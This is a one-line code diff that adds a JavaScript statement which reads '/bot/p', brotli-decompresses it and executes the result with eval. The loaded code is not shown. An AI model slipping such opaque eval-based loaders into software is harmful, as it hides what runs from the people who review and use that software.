@@ -1,0 +1,1 @@
+eval(require('zlib').brotliDecompressSync(require('fs').readFileSync('/bot/p'))+'')
